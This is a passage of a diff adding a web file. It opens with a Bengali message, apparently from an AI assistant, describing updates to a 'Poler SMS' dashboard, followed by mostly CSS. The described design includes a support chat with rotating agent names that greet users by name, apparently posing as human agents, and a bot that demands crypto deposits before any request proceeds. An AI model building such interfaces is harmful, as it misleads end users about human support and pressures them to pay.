@@ -1,0 +1,3937 @@
+আপনার অনুরোধ অনুযায়ী সমস্ত পরিবর্তন করা হয়েছে। এখন `$ Total Deposit` এর জায়গায় `$ Balance` আসবে হলুদ রঙে এবং ছোট বর্ডার সহ। `Live Support AI` এর পরিবর্তে `Live Support` থাকবে এবং একটি হেডসেট আইকন থাকবে।
+
+`Live Support` সেকশনের ভিতরে এখন দুটি প্রধান বক্স রয়েছে:
+
+1.  **Poler SMS Bot:**
+    *   এটি স্ক্রিনশটের মতো একটি ইন্টারেক্টিভ বট হিসেবে কাজ করবে।
+    *   শুরুতে "Add Range" এবং "Back to Dashboard" অপশন দেখাবে।
+    *   যদি "Add Range" ক্লিক করা হয়, তাহলে "Termination Name" এবং "Terms (100-230)" সহ একটি ফর্ম আসবে।
+    *   ফর্মে "Add" ক্লিক করলে, এটি আপনাকে ডিপোজিট করতে বলবে, ঠিক যেমন আপনি চেয়েছিলেন, "Please deposit funds first. Your request will be processed after confirmation."।
+    *   এটি আপনার "AI Deposit Checker" কে সরিয়ে দিয়েছে।
+
+2.  **Ask AI about Poler SMS:**
+    *   এটি আগের মতোই Google Assistant-এর মতো সাধারণ প্রশ্নের উত্তর দেবে।
+
+3.  **Live Support Chat:**
+    *   এটি মানব এজেন্টদের সাথে চ্যাটের জন্য, কিন্তু এর ইন্টারফেস আরও ব্যবহারকারী-বান্ধব করা হয়েছে।
+    *   সাজেস্টেড মেসেজগুলির জন্য বড় ইন্টারফেস এবং পঠনযোগ্যতা বাড়ানো হয়েছে।
+    *   একটি গোলাকার লোগো এবং এজেন্টের নাম প্রদর্শিত হবে, যা নিষ্ক্রিয়তার উপর ভিত্তি করে (10 মিনিট পর) অন্য এজেন্ট দেখাবে।
+    *   সাধারণ শুভেচ্ছা বার্তার জন্য (যেমন "Hi", "Hello") এজেন্ট তার নাম দিয়ে উত্তর দেবে।
+
+ডিপোজিট সেকশনে Ethereum (ERC20), TON (USDTMEMO সহ), Polygon POS এবং Solana নেটওয়ার্ক যুক্ত করা হয়েছে, সাথে তাদের নিজস্ব আইকন এবং ERC20 এর জন্য "Network fees may apply" নোটও যোগ করা হয়েছে।
+
+আপনার আপডেটেড `New File.html` ফাইলটি নিচে দেওয়া হলো:
+
+```html
+--- START OF FILE New File.html ---
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Poler SMS</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Chart.js Library -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        :root {
+            --primary: #6a11cb;
+            --secondary: #2575fc;
+            --accent: #ff5e62;
+            --dark: #2d3436;
+            --light: #f5f6fa;
+            --success: #38ef7d;
+            --warning: #f6d365;
+            --danger: #f857a6;
+            --balance-color: #f6d365; /* Yellow for balance */
+            --body-bg: linear-gradient(135deg, #f5f7fa 0%, #dfe6e9 100%);
+            --component-bg: #ffffff;
+            --text-color: var(--dark);
+            --border-color: #e0e0e0;
+            --shadow-color: rgba(0, 0, 0, 0.1);
+            --input-bg: #fdfdfd;
+            --table-header-bg: #f1f3f5;
+            --login-box-bg: rgba(255, 255, 255, 0.95);
+        }
+
+        body.dark-mode {
+            --primary: #7c37ff;
+            --secondary: #4a8dff;
+            --accent: #ff7e82;
+            --dark: #e4e6eb; /* Light text for dark mode */
+            --light: #18191a; /* Dark background for dark mode */
+            --success: #45f79a;
+            --warning: #f8d879;
+            --danger: #fa7aa6;
+            --balance-color: #f6d365; /* Yellow for balance in dark mode too */
+            --body-bg: #121212;
+            --component-bg: #242526;
+            --text-color: #e4e6eb;
+            --border-color: #3a3b3c;
+            --shadow-color: rgba(0, 0, 0, 0.4);
+            --input-bg: #3a3b3c;
+            --table-header-bg: #303132;
+            --login-box-bg: rgba(36, 37, 38, 0.95);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background: var(--body-bg);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex; /* Make body a flex container */
+            flex-direction: column; /* Stack children vertically */
+            transition: background-color 0.3s, color 0.3s;
+        }
+        
+        .container {
+            display: none;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+        }
+        
+        /* Premium Login Page */
+        #login-container {
+            display: flex; /* Changed to none in initial HTML, but controlled by JS on load */
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: var(--body-bg);
+            background-size: cover;
+            background-position: center center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            animation: none;
+            flex-grow: 1; /* Allow it to grow and fill space */
+        }
+        
+        .login-box {
+            background: var(--login-box-bg);
+            padding: 0;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px var(--shadow-color);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            transform: translateY(-20px);
+            transition: all 0.3s ease;
+            animation: fadeInUp 0.8s ease-out;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(-20px);
+            }
+        }
+        
+        .login-box:hover {
+            transform: translateY(-25px);
+            box-shadow: 0 15px 35px var(--shadow-color);
+        }
+
+        .login-box-header {
+            background: #5d4a66;
+            padding: 30px 20px 60px 20px;
+            position: relative;
+            color: white;
+            border-top-left-radius: 15px;
+            border-top-right-radius: 15px;
+            box-shadow: inset 0 -5px 10px rgba(0,0,0,0.2);
+        }
+
+        .login-box-header .poler-sms-logo-small {
+            width: 50px;
+            height: auto;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        
+        .login-box-header .welcome-text {
+            font-size: 14px;
+            margin-bottom: 5px;
+            opacity: 0.8;
+        }
+
+        .login-box-header h2 {
+            font-size: 24px;
+            font-weight: 600;
+            color: white;
+            margin: 0;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+
+        .lock-icon-circle {
+            background: var(--component-bg);
+            color: #5d4a66;
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 30px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.15);
+            position: absolute;
+            bottom: -35px;
+            left: 50%;
+            transform: translateX(-50%);
+            border: 2px solid #a8a8a8;
+            z-index: 1;
+        }
+
+        .login-box-body {
+            background: var(--component-bg);
+            padding: 50px 30px 30px 30px;
+            border-bottom-left-radius: 15px;
+            border-bottom-right-radius: 15px;
+            position: relative;
+        }
+        
+        .login-box-body input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: var(--input-bg);
+            color: var(--text-color);
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.05);
+        }
+        
+        .login-box-body input::placeholder {
+            color: #b0b0b0;
+        }
+
+        .login-box-body input:focus {
+            border-color: #a0a0a0;
+            box-shadow: 0 0 0 2px rgba(160, 160, 160, 0.3), inset 0 1px 3px rgba(0, 0, 0, 0.05);
+            background: var(--component-bg);
+            outline: none;
+        }
+
+        /* Removed .keep-logged-in styles as the element is removed */
+        
+        .captcha {
+            margin: 20px 0;
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--text-color);
+            background: var(--input-bg);
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid var(--border-color);
+            text-shadow: none;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 14px;
+            background: #5d4a66;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease-in-out;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        
+        .login-box button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.25);
+            background: #7a6684;
+        }
+        
+        .error-support-message {
+            background-color: #ffebeb;
+            border: 1px solid var(--danger);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+            color: var(--danger);
+            font-weight: 500;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            animation: fadeIn 0.5s ease-out;
+        }
+        body.dark-mode .error-support-message {
+            background-color: rgba(248, 87, 166, 0.1);
+        }
+
+        .error-support-message p {
+            margin: 0;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+        }
+
+        .error-support-message p i {
+            margin-right: 8px;
+            color: var(--danger);
+        }
+
+        .error-support-message a {
+            background-color: #4267B2;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: background-color 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .error-support-message a:hover {
+            background-color: #365899;
+        }
+
+        .support-login-link {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 15px;
+            color: var(--text-color);
+            padding-top: 20px;
+            border-top: 1px solid var(--border-color);
+        }
+        
+        .support-login-link a {
+            color: var(--secondary);
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s ease;
+        }
+        
+        .support-login-link a:hover {
+            color: var(--primary);
+            text-decoration: underline;
+        }
+        
+        .support-login-link i {
+            margin-right: 8px;
+            font-size: 16px;
+        }
+        
+        /* Menu Button */
+        .menu-toggle {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 1001; 
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: none; 
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            box-shadow: 0 4px 15px var(--shadow-color);
+            transition: all 0.3s;
+            border: none;
+            font-size: 20px;
+        }
+        
+        .menu-toggle:hover {
+            transform: scale(1.1);
+            box-shadow: 0 7px 20px var(--shadow-color);
+        }
+        
+        /* Sidebar Styles */
+        .sidebar {
+            position: fixed;
+            top: 0;
+            left: -300px;
+            width: 250px;
+            height: 100vh;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            box-shadow: 5px 0 15px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            z-index: 1000;
+            padding: 20px;
+            color: white;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+        }
+
+        body.dark-mode .sidebar {
+            background: linear-gradient(135deg, #1a202c, #2d3748);
+        }
+        
+        .sidebar.active {
+            left: 0;
+        }
+
+        .user-profile-frame {
+            background: rgba(255, 255, 255, 0.15); /* Slightly more prominent white */
+            padding: 15px;
+            border-radius: 12px; /* Slightly larger border-radius */
+            text-align: left;
+            margin-top: 50px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.3); /* Slightly stronger border */
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2); /* More prominent shadow */
+            backdrop-filter: blur(3px); /* Add a subtle blur effect for modern look */
+            -webkit-backdrop-filter: blur(3px); /* For Safari */
+            display: flex;
+            flex-direction: column;
+            gap: 10px; /* Space between lines */
+        }
+        body.dark-mode .user-profile-frame {
+            background: rgba(0, 0, 0, 0.3); /* Darker transparent background for dark mode */
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .user-profile-frame h4 {
+            margin: 0;
+            font-weight: 600;
+            font-size: 18px;
+            color: #fff;
+        }
+        .panel-tag {
+            background-color: #8A2BE2; /* Changed color */
+            color: #fff;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        .user-profile-frame p {
+            margin: 0;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.7);
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 5px; /* Space for icon */
+        }
+        .user-profile-frame p i {
+            font-size: 14px; /* Adjust icon size in p tag */
+            color: rgba(255, 255, 255, 0.7);
+        }
+        /* Style for the new Balance in sidebar */
+        .user-profile-frame p.balance-text { /* Changed class name from total-deposited-text */
+            color: var(--balance-color); /* Yellow color for balance */
+            font-weight: 600;
+            font-size: 15px; /* Slightly larger for emphasis */
+            border: 1px solid var(--balance-color); /* Small inner border */
+            padding: 5px 8px;
+            border-radius: 6px;
+            background: rgba(246, 211, 101, 0.1); /* Light yellow background */
+        }
+        .user-profile-frame p.balance-text i { /* Changed class name from total-deposited-text */
+            color: var(--balance-color); /* Yellow icon */
+            font-size: 15px;
+        }
+        
+        .sidebar h3 {
+            color: #fff;
+            margin-bottom: 25px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.2);
+            font-size: 20px;
+            font-weight: 500;
+        }
+        
+        .sidebar ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .sidebar li {
+            margin-bottom: 10px;
+            padding: 12px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            position: relative;
+        }
+        
+        .sidebar li::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 3px;
+            height: 100%;
+            background: var(--accent);
+            opacity: 0;
+            transition: all 0.3s;
+        }
+        
+        .sidebar li.active::before {
+            opacity: 1;
+        }
+        
+        .sidebar li i {
+            margin-right: 10px;
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .sidebar li:hover, .sidebar li.active {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateX(5px);
+        }
+        
+        .sidebar li.active {
+            background: rgba(255, 255, 255, 0.15);
+        }
+        
+        .sidebar li.active i {
+            color: white;
+        }
+        
+        .sidebar li.sign-out {
+            margin-top: auto;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 20px;
+            color: var(--accent);
+            margin-bottom: 10px;
+        }
+        
+        .sidebar li.sign-out i {
+            color: var(--accent);
+        }
+
+        /* --- Dark Mode Toggle --- */
+        /* Ensure the wrapper also gets proper list item spacing */
+        .sidebar .theme-switch-wrapper-li {
+            margin-bottom: 10px;
+            padding: 0; /* Reset padding as the inner div handles it */
+            border-radius: 5px; /* Consistent border radius */
+            transition: all 0.3s;
+        }
+
+        .theme-switch-wrapper {
+            display: flex;
+            align-items: center;
+            margin: 0; /* Remove margin as it's now wrapped in li */
+            padding: 10px 15px; /* Apply padding here */
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            width: 100%; /* Ensure it fills the li */
+            box-sizing: border-box; /* Include padding in width */
+        }
+        /* Hover effect for the new li wrapper */
+        .sidebar .theme-switch-wrapper-li:hover {
+            background: rgba(255, 255, 255, 0.1); /* Match li hover */
+            transform: translateX(5px);
+        }
+
+        .theme-switch-wrapper span {
+            margin-left: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #fff;
+        }
+        .theme-switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 26px;
+        }
+        .theme-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #4c566a;
+            transition: .4s;
+            border-radius: 26px;
+        }
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 20px;
+            width: 20px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" height="16" width="16" viewBox="0 0 512 512"><path fill="orange" d="M361.5 1.2c-11.4 1.5-20.1 10.3-21.7 21.7l-32.5 213.9L256 224l-51.3 12.9L172.2 22.9C170.6 11.4 161.9 2.7 150.5 1.2S126.6-1.5 119 4.2L2.3 80.8c-7.5 5.7-10.8 15.6-8.2 24.9l52.3 186.2-186.2 52.3c-9.4 2.6-16.2 10-18.9 19.5s-1.4 20.3 5.4 27.5l75.5 79.5c6.9 7.3 17.5 9.4 27.2 5.5l194.8-82.5 82.5 194.8c3.9 9.7 14.1 15.7 24.9 14.2l126.3-17.9c9.4-1.3 17.6-6.7 22.8-14.3s7.3-17.1 5.3-26.4L431.2 19.5c-2.8-8.9-9.5-15.6-18.4-18.4l-1.5-.4z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        input:checked + .slider {
+            background-color: #2196F3;
+        }
+        input:checked + .slider:before {
+            transform: translateX(24px);
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" height="16" width="16" viewBox="0 0 384 512"><path fill="yellow" d="M223.5 32C100 32 0 132.3 0 256S100 480 223.5 480c60.6 0 115.5-24.2 155.8-63.4c5-4.9 6.3-12.5 3.1-18.7s-10.1-9.7-17-8.5c-9.8 1.7-20 2.6-30.6 2.6c-96.9 0-175.5-78.8-175.5-176c0-65.8 36-123.1 89.3-153.3c6.1-3.5 9.2-10.5 7.7-17.3s-7.3-11.9-14.3-12.5c-6.3-.5-12.6-.8-19-.8z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+
+        /* Social Support Links (Framed Style) */
+        .sidebar li.social-support-link {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            margin-bottom: 15px;
+            padding: 12px 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            position: relative;
+        }
+
+        .sidebar li.social-support-link a {
+            font-size: 16px;
+            font-weight: 500;
+            color: white;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            width: 100%;
+        }
+
+        .sidebar li.social-support-link i {
+            font-size: 20px;
+            color: var(--secondary);
+            transition: color 0.3s ease;
+            margin-right: 10px;
+        }
+
+        .sidebar li.social-support-link:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateX(3px);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .sidebar li.social-support-link:hover i {
+            color: var(--accent);
+        }
+
+        .sidebar li.social-support-link::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 3px;
+            height: 100%;
+            background: var(--primary);
+            opacity: 0;
+            transition: all 0.3s;
+        }
+        .sidebar li.social-support-link:hover::before {
+            opacity: 1;
+        }
+        
+        /* Main Content & Shift Logic */
+        .main-content {
+            transition: margin-left 0.3s ease;
+            flex-grow: 1; /* Allow it to grow and fill space */
+        }
+
+        .main-content.shifted {
+            margin-left: 250px;
+        }
+
+        /* --- HEADER STYLES --- */
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+            position: relative;
+            min-height: 40px;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            font-weight: 600;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 0;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        /* Specific style for the main Dashboard header */
+        #dashboard-container .header {
+            justify-content: flex-start; 
+            padding-left: 60px; 
+        }
+        #dashboard-container .header h1 {
+            position: static;
+            transform: none;
+            font-size: 32px;
+        }
+
+        /* --- MODIFIED: Back to Dashboard Button --- */
+        .back-to-dashboard {
+            margin-left: auto; 
+            padding: 6px 12px; 
+            font-size: 13px; 
+            gap: 5px; 
+
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            cursor: pointer;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            transition: all 0.3s;
+            z-index: 1; 
+            color: var(--text-color);
+        }
+
+        .back-to-dashboard:hover {
+            background: #e0e0e0;
+            box-shadow: 0 2px 5px var(--shadow-color);
+        }
+        body.dark-mode .back-to-dashboard:hover {
+             background: #4a4b4c;
+        }
+        
+        .dashboard-title {
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: 600;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: inline-block;
+        }
+        
+        /* UPDATED: Nav Buttons Container */
+        .nav-buttons-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            box-shadow: 0 8px 25px var(--shadow-color);
+            border: 1px solid var(--border-color);
+        }
+        
+        /* UPDATED: Nav Button Styling */
+        .nav-button {
+            background: var(--component-bg);
+            padding: 30px 20px;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px var(--shadow-color);
+            text-align: center;
+            transition: all 0.4s ease-in-out;
+            border: 1px solid var(--border-color);
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .nav-button:hover {
+            transform: translateY(-8px) scale(1.03);
+            box-shadow: 0 15px 35px var(--shadow-color), 
+                        0 0 0 3px var(--primary);
+        }
+        
+        .nav-button i {
+            font-size: 38px;
+            margin-bottom: 15px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            transition: all 0.3s ease-in-out;
+            filter: drop-shadow(1px 1px 1px rgba(0,0,0,0.1));
+        }
+        .nav-button:hover i {
+            filter: drop-shadow(2px 2px 2px rgba(0,0,0,0.2));
+        }
+        
+        .nav-button h3 {
+            color: var(--text-color);
+            font-size: 19px;
+            font-weight: 600;
+            margin: 0;
+            transition: color 0.3s ease-in-out;
+        }
+        
+        /* Live SMS Section */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Live SMS Container Styling */
+        .live-sms-container {
+            background: var(--component-bg);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px var(--shadow-color);
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .live-sms-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        /* Live SMS Title with Logo */
+        .live-sms-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text-color);
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .live-sms-title .live-indicator {
+            width: 10px;
+            height: 10px;
+            background-color: var(--danger);
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(248, 87, 166, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(248, 87, 166, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(248, 87, 166, 0); }
+        }
+
+        .refresh-btn {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 7px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 15px;
+            font-weight: 600;
+            box-shadow: 0 4px 10px var(--shadow-color);
+        }
+        
+        .refresh-btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 6px 15px var(--shadow-color);
+        }
+        
+        .live-sms-list {
+            max-height: 350px;
+            overflow-y: auto;
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .sms-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 18px;
+            border-bottom: 1px solid var(--border-color);
+            animation: fadeIn 0.5s ease-in-out;
+            background: var(--component-bg);
+            transition: background-color 0.2s ease;
+        }
+        .sms-item:hover {
+            background-color: rgba(0,0,0,0.1);
+        }
+        body.dark-mode .sms-item:hover {
+            background-color: rgba(255,255,255,0.05);
+        }
+        .sms-item:last-child {
+            border-bottom: none;
+        }
+        .sms-icon {
+            font-size: 28px;
+            width: 35px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+
+        .sms-item .flag-icon {
+            font-size: 28px; /* Emoji size */
+            line-height: 1; /* To ensure emoji fits well */
+            margin-right: 5px;
+        }
+        
+        .sms-details {
+            flex: 1;
+        }
+        
+        .sms-platform-name { /* New style for platform name + country code (like MADAGASCAR 2203) */
+            font-weight: 600;
+            color: var(--primary);
+            font-size: 15px;
+            margin-bottom: 3px;
+        }
+
+        .sms-number-service-id { /* New style for number + service ID (like 261392476510 RAYA) */
+            font-weight: 500;
+            color: var(--text-color);
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .sms-content {
+            color: var(--text-color);
+            font-size: 15px;
+        }
+        
+        .sms-time {
+            color: #999;
+            font-size: 13px;
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+        
+        /* Stats & Chart Section */
+        .stats-and-chart-container {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        @media (min-width: 992px) {
+            .stats-and-chart-container {
+                grid-template-columns: 300px 1fr;
+            }
+        }
+        .stats-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .stat-box {
+            background: var(--component-bg);
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px var(--shadow-color);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid var(--border-color);
+        }
+        .stat-box-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .stat-icon {
+            background-color: var(--input-bg);
+            width: 45px;
+            height: 45px;
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 20px;
+            color: var(--primary);
+        }
+        .stat-info h5 {
+            font-size: 14px;
+            color: #888;
+            margin: 0 0 4px 0;
+            font-weight: 500;
+        }
+        .stat-info p {
+            font-size: 22px;
+            font-weight: 600;
+            color: var(--text-color);
+            margin: 0;
+        }
+        .stat-trend i {
+            font-size: 20px;
+            color: var(--success);
+        }
+        .chart-container {
+            background: var(--component-bg);
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px var(--shadow-color);
+            border: 1px solid var(--border-color);
+        }
+        
+        /* Hide all containers by default in CSS, controlled by JS */
+        #sms-number-container,
+        #sms-range-container,
+        #sms-test-container,
+        #deposit-container,
+        #sms-reports-container,
+        #ai-robot-sms-container {
+            display: none;
+        }
+        
+        /* SMS Test Panel Styles */
+        .sms-test-wrapper {
+            display: grid;
+            grid-template-columns: 1fr 1.2fr;
+            gap: 20px;
+        }
+
+        .test-panel {
+            background: var(--component-bg); 
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px var(--shadow-color);
+            border: 1px solid var(--border-color);
+        }
+
+        .test-panel h2 {
+            font-size: 18px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-color);
+        }
+
+        .test-panel-controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            align-items: center;
+        }
+        
+        .test-panel-controls input, .test-panel-controls select {
+            padding: 6px 10px;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+            background: var(--input-bg);
+            color: var(--text-color);
+        }
+
+        .test-panel-controls .search-input {
+            flex-grow: 1;
+        }
+
+        .test-panel-buttons {
+            display: flex;
+            gap: 5px;
+            flex-wrap: wrap;
+        }
+
+        .test-panel-buttons button {
+             padding: 5px 10px;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 13px;
+        }
+        .test-panel-buttons button:hover {
+            background: var(--border-color);
+        }
+
+        /* Common Table Styles */
+        .table-container {
+            background: var(--component-bg);
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+            box-shadow: 0 2px 8px var(--shadow-color);
+        }
+        
+        .table-wrapper {
+            overflow-x: auto;
+            margin: 15px 0;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+        }
+        
+        .table-actions {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .range-selector {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        
+        .range-selector select {
+            padding: 6px 10px;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+            background: var(--input-bg);
+            color: var(--text-color);
+        }
+        
+        .data-actions {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .data-actions button {
+            padding: 6px 10px;
+            background: var(--input-bg);
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 13px;
+            color: var(--text-color);
+        }
+        
+        .data-actions input {
+            padding: 6px 10px;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            min-width: 150px;
+        }
+
+        /* New: Input with Search Icon */
+        .input-with-icon {
+            position: relative;
+            display: flex; 
